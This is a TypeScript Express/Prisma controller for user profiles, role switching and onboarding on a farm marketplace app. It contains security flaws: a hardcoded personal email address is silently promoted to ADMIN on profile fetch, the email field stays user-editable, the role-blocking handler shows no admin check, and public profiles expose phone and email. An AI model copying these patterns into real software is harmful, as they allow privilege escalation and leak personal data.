import { Request, Response } from 'express';
import prisma from '../config/db';
import { sanitizeUser } from '../utils/helper';
import { z } from 'zod';
import { Role, RoleAccessStatus } from '@prisma/client';
import { signToken } from '../utils/jwtUtils';

// 💡 Zod Schema (Updated to include bank and aadhaar)
const updateProfileSchema = z.object({
  name: z.string().min(1).optional(),
  email: z.string().email().optional(),
  phone: z.string().regex(/^[6-9]\d{9}$/, "Must be a valid 10-digit Indian mobile number").optional(),
  village: z.string().optional(),
  district: z.string().optional(),
  state: z.string().optional(),
  pincode: z.string().optional(),
  vehicleType: z.enum(['BIKE','AUTO','TEMPO','MINI_TRUCK']).optional(),
  coverageRadiusKm: z.number().int().positive().optional(),
  latitude: z.number().optional(),
  longitude: z.number().optional(),
  aadhaarLast4: z.string().length(4, "Aadhaar must be exactly 4 digits").optional(),
  bankAccount: z.string().min(5).optional(),
  bankIfsc: z.string().min(11).optional(),
  farmArea: z.number().positive().nullable().optional(),
  
  // New profile fields
  aboutMe: z.string().optional(),
  dob: z.string().optional(),
  gender: z.string().optional(),
  languagePref: z.string().optional(),
  vehicleNumber: z.string().optional(),
  vehicleColor: z.string().optional(),
  bankName: z.string().optional(),
  accountHolderName: z.string().optional(),
  aadhaarUrl: z.string().optional(), // base64 data URI or empty string
  dlUrl: z.string().optional(),    // base64 data URI or empty string
  rcUrl: z.string().optional(),    // base64 data URI or empty string
  
  // Farm Details
  primaryCrops: z.string().optional(),
  farmingType: z.string().optional(),
  soilType: z.string().optional(),
  waterSource: z.string().optional(),
});

const getCurrentUser = async (userId: string) => {
  let dbUser = await prisma.user.findUnique({ where: { id: userId } });

  if (!dbUser) {
    return null;
  }

  if (dbUser.email === 'harshindoria911@gmail.com' && !dbUser.roles.includes('ADMIN')) {
    dbUser = await prisma.user.update({
      where: { id: userId },
      data: { roles: [...dbUser.roles, 'ADMIN'] }
    });
  }

  return dbUser;
};

export const buyerProfile = async (req: Request, res: Response): Promise<void> => {
  try {
    const userId = req.user?.id;
    if (!userId) {
      res.status(404).json({ success: false, error: 'User not found' });
      return;
    }

    const dbUser = await getCurrentUser(userId);
    if (!dbUser) {
      res.status(404).json({ success: false, error: 'User not found' });
      return;
    }

    res.status(200).json({ success: true, user: sanitizeUser(dbUser) });
  } catch (error) {
    console.error('Error in fetching buyer profile:', error);
    res.status(500).json({ success: false, message: 'Could not fetch buyer profile' });
  }
};

export const deliveryProfile = async (req: Request, res: Response): Promise<void> => {
  try {
    const userId = req.user?.id;
    if (!userId) {
      res.status(404).json({ success: false, error: 'User not found' });
      return;
    }

    const dbUser = await getCurrentUser(userId);
    if (!dbUser) {
      res.status(404).json({ success: false, error: 'User not found' });
      return;
    }

    const allJobs = await prisma.deliveryJob.findMany({
      where: { deliveryPartnerId: userId }
    });

    const completedJobs = allJobs.filter((j: any) => j.status === 'DELIVERED');
    const cancelledJobs = allJobs.filter((j: any) => j.status === 'CANCELLED');
    const totalDeliveries = completedJobs.length;
    const terminalJobs = totalDeliveries + cancelledJobs.length;

    const completionRate = terminalJobs > 0 ? Math.round((totalDeliveries / terminalJobs) * 100) : 0;
    const cancellationRate = terminalJobs > 0 ? Math.round((cancelledJobs.length / terminalJobs) * 100) : 0;

    const onTimeDeliveries = completedJobs.filter((j: any) => {
      if (!j.estimatedDeliveryAt || !j.deliveredAt) return true;
      return j.deliveredAt <= j.estimatedDeliveryAt;
    }).length;

    const onTimeRate = totalDeliveries > 0 ? Math.round((onTimeDeliveries / totalDeliveries) * 100) : 0;

    const deliveryStats = {
      totalDeliveries,
      completionRate,
      cancellationRate,
      onTimeRate
    };

    res.status(200).json({ success: true, user: sanitizeUser(dbUser), deliveryStats });
  } catch (error) {
    console.error('Error in fetching delivery profile:', error);
    res.status(500).json({ success: false, message: 'Could not fetch delivery profile' });
  }
};

export const farmerProfile = async (req: Request, res: Response): Promise<void> => {
  try {
    const userId = req.user?.id;
    if (!userId) {
      res.status(404).json({ success: false, error: 'User not found' });
      return;
    }

    const dbUser = await getCurrentUser(userId);
    if (!dbUser) {
      res.status(404).json({ success: false, error: 'User not found' });
      return;
    }

    const activeCrops = await prisma.crop.findMany({
      where: { farmerId: userId, status: 'ACTIVE' },
      include: { catalog: true }
    });

    res.status(200).json({ success: true, user: sanitizeUser(dbUser), activeCrops });
  } catch (error) {
    console.error('Error in fetching farmer profile:', error);
    res.status(500).json({ success: false, message: 'Could not fetch farmer profile' });
  }
};

export const getProfile = async (req: Request, res: Response): Promise<void> => {
  try {
    const userId = req.user?.id;
    if (!userId) {
      res.status(404).json({ success: false, error: 'User not found' });
      return;
    }

    const dbUser = await getCurrentUser(userId);
    if (!dbUser) {
      res.status(404).json({ success: false, error: 'User not found' });
      return;
    }

    if (dbUser.activeRole === 'DELIVERY') {
      return deliveryProfile(req, res);
    }

    if (dbUser.activeRole === 'FARMER') {
      return farmerProfile(req, res);
    }

    return buyerProfile(req, res);
  } catch (error) {
    console.error('Error in fetching user data:', error);
    res.status(500).json({ success: false, message: 'Could not fetch data' });
  }
};

// 2. Apna Profile Update karne ka function
export const updateProfile = async (req: Request, res: Response): Promise<void> => {
  try {
    const userId = req.user?.id;
    if (!userId) {
        res.status(401).json({ success: false, error: "Unauthorized access" });
        return;
    }

    // 💡 The Zod Magic: Validate and extract at the same time
    const validation = updateProfileSchema.safeParse(req.body);

    // Agar validation fail hui (e.g., kisine string ki jagah number bhej diya)
    if (!validation.success) {
        res.status(400).json({
            success: false,
            error: "Invalid data provided",
            details: validation.error.format() // Exact batayega kahan galti hui
        });
        return;
    }

    // validation.data mein ab sirf safe, verified, aur stripped fields hain!
    const safeUpdateData = validation.data;
    
    // Database mein update karein
    const updatedUser = await prisma.user.update({
        where: { id: userId },
        data: safeUpdateData // Seedha verified object pass kar diya
    });
    
    // Naya data wapas bhejein, par sanitize karke!
    res.status(200).json({
        success: true,
        message: "Profile updated successfully",
        user: sanitizeUser(updatedUser)
    });
    
  } catch (error: any) {
     if (error.code === 'P2002') {
         const field = error.meta?.target?.[0] || 'Field';
         res.status(409).json({ success: false, message: `This ${field} is already in use by another account.` });
         return;
     }
     console.error("Update Profile Error:", error);
     res.status(500).json({ success: false, message: "Could not update profile" });
  }
};

const workspaceRoles = [Role.BUYER, Role.FARMER, Role.DELIVERY, Role.ADMIN] as const;


export const switchRole = async (req: Request, res: Response): Promise<void> => {
  const parsed = z.object({ role: z.enum(workspaceRoles) }).safeParse(req.body);
  if (!parsed.success || !req.user) {
    res.status(req.user ? 400 : 401).json({ success: false, code: req.user ? 'INVALID_ROLE' : 'AUTH_REQUIRED' });
    return;
  }
  if (!req.user.roles.includes(parsed.data.role)) {
    res.status(403).json({ success: false, code: 'ROLE_NOT_ONBOARDED', role: parsed.data.role });
    return;
  }
  const user = await prisma.user.update({ where: { id: req.user.id }, data: { activeRole: parsed.data.role } });
  res.json({ success: true, user: sanitizeUser(user), token: signToken(user.id, user.roles, user.activeRole) });
};

export const onboardRole = async (req: Request, res: Response): Promise<void> => {
  if (!req.user) { res.status(401).json({ success: false, code: 'AUTH_REQUIRED' }); return; }
  const parsed = z.object({
    role: z.enum([Role.FARMER, Role.DELIVERY]),
    vehicleType: z.enum(['BIKE', 'AUTO', 'TEMPO', 'MINI_TRUCK']).optional(),
    primaryCrops: z.string().optional(),
    farmingType: z.string().optional(),
    soilType: z.string().optional(),
    waterSource: z.string().optional(),
  }).safeParse(req.body);
  if (!parsed.success) { res.status(400).json({ success: false, code: 'INVALID_ONBOARDING', errors: parsed.error.issues }); return; }
  if (parsed.data.role === Role.DELIVERY && !(parsed.data.vehicleType || req.user.vehicleType)) {
    res.status(400).json({ success: false, code: 'VEHICLE_REQUIRED', message: 'A vehicle is required for delivery onboarding.' }); return;
  }

  // Check if application is already pending
  const existingAccess = await prisma.userRoleAccess.findUnique({
    where: { userId_role: { userId: req.user.id, role: parsed.data.role } }
  });
  
  if (existingAccess && existingAccess.status === 'PENDING_APPROVAL') {
    res.status(409).json({ success: false, message: 'You have already submitted an application for this role. Please wait for admin approval.' });
    return;
  }

  const access = await prisma.$transaction(async tx => {
    // Update user based on role
    const updateData: any = {};
    if (parsed.data.vehicleType) updateData.vehicleType = parsed.data.vehicleType;
    if (parsed.data.role === Role.FARMER) {
      if (parsed.data.primaryCrops) updateData.primaryCrops = parsed.data.primaryCrops;
      if (parsed.data.farmingType) updateData.farmingType = parsed.data.farmingType;
      if (parsed.data.soilType) updateData.soilType = parsed.data.soilType;
      if (parsed.data.waterSource) updateData.waterSource = parsed.data.waterSource;
    }
    
    if (Object.keys(updateData).length > 0) {
      await tx.user.update({
        where: { id: req.user!.id },
        data: updateData,
      });
    }

    return tx.userRoleAccess.upsert({
      where: { userId_role: { userId: req.user!.id, role: parsed.data.role } }, 
      update: { status: RoleAccessStatus.PENDING_APPROVAL },
      create: { userId: req.user!.id, role: parsed.data.role, status: RoleAccessStatus.PENDING_APPROVAL },
    });
  });
  
  // We don't update user.roles or activeRole here. Admin will do it.
  const user = await prisma.user.findUnique({ where: { id: req.user!.id } });
  res.status(201).json({ 
    success: true, 
    message: "Application submitted for admin approval.",
    user: sanitizeUser(user!), 
    access 
  });
};

export const setRoleBlock = async (req: Request, res: Response): Promise<void> => {
  if (!req.user) { res.status(401).json({ success: false }); return; }
  const parsed = z.object({
    userId: z.string().min(1), role: z.enum(workspaceRoles), blocked: z.boolean(),
    reason: z.string().trim().min(3).max(500).optional(), blockedUntil: z.coerce.date().optional(),
  }).safeParse(req.body);
  if (!parsed.success || (parsed.data.blocked && !parsed.data.reason)) {
    res.status(400).json({ success: false, code: 'INVALID_ROLE_BLOCK', errors: parsed.success ? undefined : parsed.error.issues }); return;
  }
  const access = await prisma.userRoleAccess.upsert({
    where: { userId_role: { userId: parsed.data.userId, role: parsed.data.role } },
    create: { userId: parsed.data.userId, role: parsed.data.role },
    update: parsed.data.blocked ? {
      status: RoleAccessStatus.BLOCKED, reason: parsed.data.reason, blockedAt: new Date(),
      blockedUntil: parsed.data.blockedUntil, blockedByAdminId: req.user.id,
    } : { status: RoleAccessStatus.ACTIVE, reason: null, blockedAt: null, blockedUntil: null, blockedByAdminId: null },
  });
  res.json({ success: true, access });
};

export const getFarmerPublicProfile = async (req: Request, res: Response): Promise<void> => {
  try {
    const farmerId = req.params.id as string;

    const farmer = await prisma.user.findFirst({
      where: { id: farmerId, roles: { has: 'FARMER' } },
      select: {
        id: true,
        name: true,
        village: true,
        district: true,
        state: true,
        farmArea: true,
        rating: true,
        ratingCount: true,
        aboutMe: true,
        createdAt: true,
        isVerified: true,
        primaryCrops: true,
        farmingType: true,
        soilType: true,
        waterSource: true,
        phone: true,
        email: true,
      }
    });

    if (!farmer) {
      res.status(404).json({ success: false, message: 'Farmer not found' });
      return;
    }

    const activeCrops = await prisma.crop.findMany({
      where: { farmerId, status: 'ACTIVE' },
      include: { catalog: true }
    });

    const allReviews = await prisma.review.findMany({
      where: { targetId: farmerId, targetType: 'FARMER' },
      include: {
        reviewer: { select: { id: true, name: true } },
        order: { include: { crop: { select: { catalog: true } } } }
      },
      orderBy: { createdAt: 'desc' }
    });

    const distribution = { 1: 0, 2: 0, 3: 0, 4: 0, 5: 0 };
    const textReviews: any[] = [];

    allReviews.forEach((r: any) => {
      distribution[r.rating as keyof typeof distribution] += 1;
      if (r.comment && r.comment.trim() !== '') {
        textReviews.push(r);
      }
    });

    res.status(200).json({
      success: true,
      data: {
        ...farmer,
        activeCrops,
        reviews: {
          distribution,
          totalCount: allReviews.length,
          textReviews
        }
      }
    });
  } catch (error) {
    console.error('Get Farmer Public Profile Error:', error);
    res.status(500).json({ success: false, message: 'Failed to fetch public profile' });
  }
};

export const toggleOnlineStatus = async (req: Request, res: Response): Promise<void> => {
  try {
    const userId = req.user!.id;
    const { isOnline } = req.body; // Expect boolean
    
    if (typeof isOnline !== 'boolean') {
      res.status(400).json({ success: false, message: 'isOnline must be a boolean' });
      return;
    }

    const updatedUser = await prisma.user.update({
      where: { id: userId },
      data: { isOnline }
    });

    res.status(200).json({
      success: true,
      message: `You are now ${isOnline ? 'online' : 'offline'}`,
      data: { isOnline: updatedUser.isOnline }
    });
  } catch (error) {
    console.error('Toggle Online Status Error:', error);
    res.status(500).json({ success: false, message: 'Failed to update online status' });
  }
};
